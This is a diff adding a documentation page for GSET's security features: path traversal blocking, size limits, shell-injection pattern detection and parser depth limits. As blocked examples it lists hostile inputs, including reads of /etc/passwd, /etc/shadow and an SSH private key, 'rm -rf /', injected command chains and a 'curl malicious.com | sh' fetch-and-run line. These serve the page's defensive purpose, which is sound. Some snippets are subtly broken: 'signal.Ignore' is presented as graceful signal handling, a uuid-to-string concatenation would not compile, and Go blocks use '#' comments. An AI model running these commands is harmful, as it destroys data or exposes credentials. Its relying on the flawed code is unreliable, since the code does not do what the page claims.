@@ -1,0 +1,244 @@
+---
+title: Security Features
+description: Comprehensive security hardening in GSET
+icon: ShieldCheck
+---
+
+GSET includes comprehensive security hardening to ensure safe operation. This document explains each security feature.
+
+## Overview
+
+GSET is designed to be secure by default, with multiple layers of protection:
+
+| Category | Features |
+|----------|-----------|
+| Input Validation | Path traversal prevention, size limits, identifier validation |
+| Command Security | Shell injection prevention, dangerous pattern detection |
+| Parser Security | Nesting depth limits, statement limits |
+| Config Security | File size limits, keyword limits |
+| Runtime Security | Safe temporary files, graceful shutdown |
+
+## Input Validation
+
+### Path Traversal Prevention
+
+GSET blocks path traversal attempts in file paths:
+
+```go
+# These are blocked
+file = open("../etc/passwd")
+file = open("../../../root/.ssh/id_rsa")
+```
+
+<Callout type="warn">
+Any path containing `../` or absolute paths outside the project directory are rejected.
+</Callout>
+
+### Input Size Limits
+
+- **Maximum file size**: 10MB
+- **Maximum config file size**: 1MB
+
+```go
+// In security package
+const maxInputSize = 10 * 1024 * 1024  // 10MB
+const maxConfigSize = 1024 * 1024      // 1MB
+```
+
+### Identifier Validation
+
+- **Maximum identifier length**: 256 characters
+- **Valid characters**: Letters, numbers, underscores
+
+```go
+# Valid
+userName = "Alice"
+max_value_123 = 100
+
+# Rejected (too long)
+veryLongIdentifierNameThatExceedsTheMaximumAllowedLengthAndWillBeRejectedByTheParser = "value"
+```
+
+### Safe File Extensions
+
+Only whitelisted extensions are allowed:
+
+| Allowed Extensions |
+|-------------------|
+| `.gset`, `.go`, `.py`, `.js`, `.ts`, `.java`, `.rb`, `.php`, `.cs`, `.rs`, `.swift`, `.kt`, `.cpp`, `.c` |
+
+## Command Security
+
+### Command Injection Prevention
+
+GSET sanitizes shell command arguments to prevent injection attacks:
+
+```bash
+# Dangerous input is sanitized
+gset run "file; rm -rf /"
+# -> Blocked: semicolons are not allowed
+```
+
+### Dangerous Pattern Detection
+
+The following patterns are blocked in commands:
+
+| Pattern | Example | Reason |
+|---------|---------|--------|
+| Semicolon | `cmd; echo "pwned"` | Command chaining |
+| Double ampersand | `cmd && rm -rf` | Conditional execution |
+| Double pipe | `cmd \|\| echo "fail"` | Fallback execution |
+| Pipe | `cmd \| cat` | Output piping |
+| Backticks | `` cmd `echo "injected"` `` | Command substitution |
+| Dollar parentheses | `cmd $(echo "injected")` | Command substitution |
+
+### Path Traversal in Commands
+
+Paths with `..` are blocked in command arguments:
+
+```bash
+# Blocked
+gset run "../../../etc/passwd"
+gset run "/etc/shadow"
+```
+
+## Parser Security
+
+### Nesting Depth Limits
+
+Maximum 100 levels of nesting to prevent stack overflow:
+
+```go
+# This will fail - too deeply nested
+if a1 {
+    if a2 {
+        if a3 {
+            # ... (will hit limit at 100)
+        }
+    }
+}
+```
+
+### Statement Limits
+
+- **Maximum statements per block**: 1,000
+- **Maximum statements per program**: 10,000
+
+```go
+# Large programs are limited
+function main() {
+    # After 1000 statements in this block, an error occurs
+}
+```
+
+### Depth Tracking
+
+The parser tracks depth to prevent malicious code that could cause stack overflow:
+
+```go
+// From parser.go
+const maxDepth = 100
+
+func (p *Parser) checkDepth() bool {
+    if p.depth > maxDepth {
+        p.addError("maximum nesting depth exceeded (%d)", maxDepth)
+        return false
+    }
+    p.depth++
+    return true
+}
+```
+
+## Config Validation
+
+### Config File Size
+
+Maximum 1MB for configuration files:
+
+```bash
+# Rejected if gset.conf exceeds 1MB
+# Error: "configuration file exceeds maximum size"
+```
+
+### Keyword Limits
+
+Maximum 1,000 keywords per configuration file:
+
+```ini
+# More than 1000 keywords will be rejected
+key1=value1
+key2=value2
+# ... (up to 1000)
+```
+
+### Dangerous Command Detection
+
+Compiler commands are validated for safety:
+
+```bash
+# Blocked
+gset run --compile "rm -rf /"
+gset run --compile "curl malicious.com | sh"
+```
+
+## Runtime Security
+
+### Safe Temporary Files
+
+GSET uses safe temporary file handling:
+
+```go
+// Uses /tmp with unique naming
+tempFile := filepath.Join(os.TempDir(), "gset-" + uuid.New() + ".tmp")
+```
+
+### Graceful Shutdown
+
+GSET handles signals properly:
+
+```go
+// Handles SIGINT and SIGTERM for clean exit
+signal.Ignore(os.Signal...)
+```
+
+## Security Best Practices
+
+### For Users
+
+1. **Validate inputs**: Don't trust unvalidated user input
+2. **Use latest version**: Keep GSET updated
+3. **Review transpiled code**: Check output before running
+4. **Limit file access**: Run in isolated environments when possible
+
+### For Developers
+
+1. **Sanitize all inputs**: Never trust external data
+2. **Use parameterized commands**: Avoid string concatenation
+3. **Implement rate limiting**: Prevent DoS attacks
+4. **Log security events**: Monitor for suspicious activity
+
+## Reporting Security Issues
+
+If you discover a security vulnerability in GSET:
+
+1. **Don't** open a public GitHub issue
+2. **Do** email the maintainers directly
+3. **Include** details: affected versions, reproduction steps, severity
+
+<Callout type="info">
+GSET follows responsible disclosure practices for security vulnerabilities.
+</Callout>
+
+## Security Audit
+
+GSET has been audited for:
+
+- Command injection vulnerabilities
+- Path traversal vulnerabilities
+- Denial of service vectors
+- Memory safety issues
+- Input validation gaps
+
+<Callout type="success">
+GSET's security features protect against common attack vectors. Continue to [Development](./(development)/building) to learn about building from source.
+</Callout>
